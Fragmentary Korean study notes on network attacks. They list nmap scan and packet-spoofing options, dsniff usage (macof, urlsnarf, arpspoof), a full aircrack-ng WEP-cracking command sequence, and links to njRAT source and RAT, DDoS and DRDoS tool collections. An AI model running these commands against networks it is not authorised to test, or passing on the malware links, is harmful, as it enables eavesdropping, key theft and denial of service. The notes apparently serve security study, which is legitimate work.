...
* 네트워크의 연결 방법, 통신의 취약점을 이용해서 도청, 정보 유출, 정보 변조, 서비스 거부 등 여러가지 악성행위를 일으키는 방법이다.
...
* sF : TCP FIN scan
* sX : TCP Xmas scan
* \--scanflags : custom TCP scan ( ex -> nmap --scanflags SYNFIN 192.168.0.0 )
* sO : IP protocol scan
...
* S : 지정한 ip주소로 변조하여 보냄
* e : 지정한 인터페이스로 보냄
* g / --source-port : 지정한 포트번호를 출발지로 설정
* \--data : 전송 패킷에 페이로드 추가
* \--data-string : 전송 패킷에 지정 문자 추가
* \--data-length : 전송 패킷에 지정한 길이의 랜덤 데이터 추가
* \--ttl : 지정한 값으로 TTL 설정
...
* 툴은 네트워크 분석, 공격 dsniff, mac 주소 오버플로우 macof, CLF를 이용하여 http 가로채는 urlsnarf
* macof -s \<source\_ip> -d \<destination\_ip> -e \<dst\_hw> -x \<src\_port> -y \<dst\_port> -i
* ex) macof -d 192.168.0.1 -i eth0
* urlsnarf -i -p \<pcap\_file> -v \<reg\_pattern>
...
* arpspoof -i -t \<dest\_ip> -r \<gw\_ip> -c
...
```
ifconfig wlan0 downs
airmon-ng start wlan0
iwconfig
airodump-ng wlan0mon
airodump-ng -c <ch> -w <savefilename> --bssid <bssid> wlan0mon

(new terminal)
aireplay-ng -1 0 -a <AP's mac> -h <wlan0's mac> wlan0mon
aireplay-ng -3 -b <AP's mac> -h <wlan0's mac> wlan0mon
(data > 10000)
aircrack-ng -b <AP's mac> <savefilename.cap>
```
...
* njRAT : https://github.com/BlackAll9/NjRat.0.7D
* RAT github : https://github.com/topics/remote-administration-tool
...
* DDOS github : https://github.com/topics/ddos-attack-tools
...
* Rapid Reset : HTTP2의 RST\_STREAM 패킷을 이용한 공격
...
* DRDOS github : https://github.com/topics/drdos
